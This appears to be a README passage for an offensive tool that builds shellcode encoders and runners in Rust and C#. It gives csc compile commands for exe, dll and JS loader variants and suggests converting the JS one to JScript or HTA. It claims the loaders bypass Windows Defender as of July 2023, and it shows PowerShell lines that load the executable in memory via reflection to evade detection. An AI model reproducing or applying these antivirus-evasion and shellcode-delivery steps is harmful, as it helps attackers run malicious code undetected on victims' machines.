### Rust Compiling

It does not matter what you do to run the encoders, but for the shellcode, make sure you are compiling the shellcode runner using the right toolchain if you are running it on windows. I used the windows-gnu one.

### CSharp Compiling

I use the BigInteger to make my life easier. Compilation for the executable is:
``` powershell
PS> csc /t:exe /out:shell.exe /r:[path_to_System.Numerics.dll_use_the_GAC_MSIL_one] .\polynomial_exe.cs

PS> csc /t:library /out:shell.dll /r:[path_to_System.Numerics.dll_use_the_GAC_MSIL_one] .\polynomial_dll.cs
PS> csc /t:library /out:shell.dll /r:[path_to_System.Numerics.dll_use_the_GAC_MSIL_one] .\polynomial_js.cs
```
Convert the js one to JScript or an HTA as you wish. As of July 2023, it will bypass modern Windows Defender.

As a side note, for further obfuscation, the exe is to be run in-memory with reflection. The entrypoint is [Polynomial]::eval()
``` powershell
# can also be condensed into a one-liner
PS> $bytes = [System.IO.File]::ReadAllBytes("C:\shellcode.exe")
PS> [Reflection.Assembly]::Load($bytes)
PS> [Polynomial]::eval()
```
